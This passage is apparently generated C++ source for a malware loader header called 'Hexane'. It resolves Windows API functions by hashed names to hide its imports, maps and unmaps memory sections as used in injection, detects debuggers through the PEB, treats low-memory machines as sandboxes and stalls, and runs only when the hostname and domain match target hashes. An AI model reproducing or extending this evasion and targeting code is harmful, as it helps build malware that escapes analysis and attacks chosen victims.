            DWORD dwNtCreateSection = HashWrapper(strNtCreateSection, Api->key.c_str(), ARRAY_LEN(strNtCreateSection), false);
            Api->lpNtCreateSection = (NtCreateSection_t) GetSymbolAddress(hmNtdll, dwNtCreateSection);

            unsigned char strNtUnmapViewOfSection[] = {{ {} }}; 
            DWORD dwNtUnmapViewOfSection = HashWrapper(strNtUnmapViewOfSection, Api->key.c_str(), ARRAY_LEN(strNtUnmapViewOfSection), false);
            Api->lpNtUnmapViewOfSection = (NtUnmapViewOfSection_t) GetSymbolAddress(hmNtdll, dwNtUnmapViewOfSection);

            unsigned char strNtMapViewOfSection[] = {{ {} }}; 
            DWORD dwNtMapViewOfSection = HashWrapper(strNtMapViewOfSection, Api->key.c_str(), ARRAY_LEN(strNtMapViewOfSection), false);
            Api->lpNtMapViewOfSection = (NtMapViewOfSection_t) GetSymbolAddress(hmNtdll, dwNtMapViewOfSection);

            unsigned char strRtlCreateHeap[] = {{ {} }}; 
            DWORD dwRtlCreateHeap = HashWrapper(strRtlCreateHeap, Api->key.c_str(), ARRAY_LEN(strRtlCreateHeap), false);
            Api->lpRtlCreateHeap = (RtlCreateHeap_t) GetSymbolAddress(hmNtdll, dwRtlCreateHeap);
            
            unsigned char strRtlAllocateHeap[] = {{ {} }}; 
            DWORD dwRtlAllocateHeap = HashWrapper(strRtlAllocateHeap, Api->key.c_str(), ARRAY_LEN(strRtlAllocateHeap), false);
            Api->lpRtlAllocateHeap = (RtlAllocateHeap_t) GetSymbolAddress(hmNtdll, dwRtlAllocateHeap);

            unsigned char strRtlFreeHeap[] = {{ {} }}; 
            DWORD dwRtlFreeHeap = HashWrapper(strRtlFreeHeap, Api->key.c_str(), ARRAY_LEN(strRtlFreeHeap), false);
            Api->lpRtlFreeHeap = (RtlFreeHeap_t) GetSymbolAddress(hmNtdll, dwRtlFreeHeap);

            unsigned char strRtlDestroyHeap[] = {{ {} }}; 
            DWORD dwRtlDestroyHeap = HashWrapper(strRtlDestroyHeap, Api->key.c_str(), ARRAY_LEN(strRtlDestroyHeap), false);
            Api->lpRtlDestroyHeap = (RtlDestroyHeap_t) GetSymbolAddress(hmNtdll, dwRtlDestroyHeap);
#pragma endregion MEMORY

#pragma region SYSTEM
            unsigned char strGetComputerNameExA[] = {{ {} }}; 
            DWORD dwGetComputerNameExA = HashWrapper(strGetComputerNameExA, Api->key.c_str(), ARRAY_LEN(strGetComputerNameExA), false);
            Api->lpGetComputerNameExA = (GetComputerNameExA_t) GetSymbolAddress(hmKernel32, dwGetComputerNameExA);

            unsigned char strGlobalMemoryStatusEx[] = {{ {} }}; 
            DWORD dwGlobalMemoryStatusEx = HashWrapper(strGlobalMemoryStatusEx, Api->key.c_str(), ARRAY_LEN(strGlobalMemoryStatusEx), false);
            Api->lpGlobalMemoryStatusEx = (GlobalMemoryStatusEx_t) GetSymbolAddress(hmKernel32, dwGlobalMemoryStatusEx);
#pragma endregion SYSTEM
        }}
    }}

    namespace SystemChecks {{
        using namespace Hexane::Api;
        using namespace Hexane::Cipher;
        using namespace Hexane::Network;

        BOOL DebugCheck() {{
            return (PEB_POINTER->BeingDebugged);
        }}

        BOOL SandboxCheck(API Api) {{

            MEMORYSTATUSEX memStatus;
            memStatus.dwLength = sizeof(memStatus);
            Api.lpGlobalMemoryStatusEx(&memStatus);

            return (GLOBAL_SYSTEM_MEMORY_IN_GB(memStatus) <= 4) ? TRUE : FALSE;
        }}

        STATUS EnvironmentCheck(LPSTR lpszHostname, LPSTR lpszDomain, API Api) {{

            DWORD dwSize = 0;

            if (!Api.lpGetComputerNameExA(ComputerNameNetBIOS, nullptr, &dwSize)) {{

                auto sysname = new CHAR[ dwSize * sizeof(CHAR) ];
                if (Api.lpGetComputerNameExA(ComputerNameNetBIOS, sysname, &dwSize)) {{

                    if (GetHashFromString((PUCHAR) lpszHostname, __alt_strlen((PUCHAR) lpszHostname)) != GetHashFromString((PUCHAR) sysname, dwSize))
                        return STATUS_FAILED;
                }}
                delete[] sysname;
            }}

            dwSize = 0;
            if (lpszDomain != nullptr) {{
                if (!Api.lpGetComputerNameExA(ComputerNameDnsDomain, nullptr, &dwSize)) {{

                    auto sysDomain = new CHAR[ dwSize * sizeof(CHAR) ];
                    if (Api.lpGetComputerNameExA(ComputerNameDnsDomain, sysDomain, &dwSize)) {{

                        if (GetHashFromString((PUCHAR) lpszDomain, __alt_strlen((PUCHAR) lpszDomain)) != GetHashFromString((PUCHAR) sysDomain, dwSize))
                            return STATUS_FAILED;
                    }}
                    delete[] sysDomain;
                }}
            }}
            return STATUS_SUCCESS;
        }}
        
        STATUS ApplicationStart(PDATASTORE Datastore, PAPI Api) {{
            
	        STATUS bSandbox, bDebug = STATUS_FAILED;

	        if (WininetLoader(Datastore, (LPSTR) KEYSTORE, FALSE, TRUE, Api) == STATUS_FAILED)
	        	return STATUS_FAILED;
        
	        ResolveSymbols(Api);
        
	        do {{ bDebug = DebugCheck();
	        	if (bDebug == STATUS_FAILED) SANDBOX_TIMEOUT; }}
	        		while (bDebug == STATUS_FAILED);
        
	        do {{ bSandbox = SandboxCheck(*Api);
	        	if (bSandbox == STATUS_FAILED) SANDBOX_TIMEOUT; }}
	        		while (bSandbox == STATUS_FAILED);
        
	        if (EnvironmentCheck((LPSTR) Api->hostname, nullptr, *Api) == STATUS_FAILED)
	        	return STATUS_FAILED;
	        	
	        return STATUS_SUCCESS;
        }}
    }}
}}

#endif //HEXANE_LOADER2_HEXANE_HPP

"""
